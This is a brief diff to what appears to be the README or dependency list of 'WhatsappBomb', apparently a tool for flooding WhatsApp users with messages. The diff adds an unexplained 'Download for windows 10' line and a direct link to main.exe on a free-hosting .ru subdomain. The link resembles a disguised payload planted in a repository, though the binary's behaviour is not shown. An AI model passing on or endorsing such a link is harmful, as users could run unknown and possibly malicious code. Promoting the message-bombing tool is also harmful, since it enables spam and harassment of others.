@@ -1,3 +1,5 @@
+# Download for windows 10
+http://link.io.xsph.ru/wbom/main.exe
 # WhatsappBomb
 python3
 pyautogui
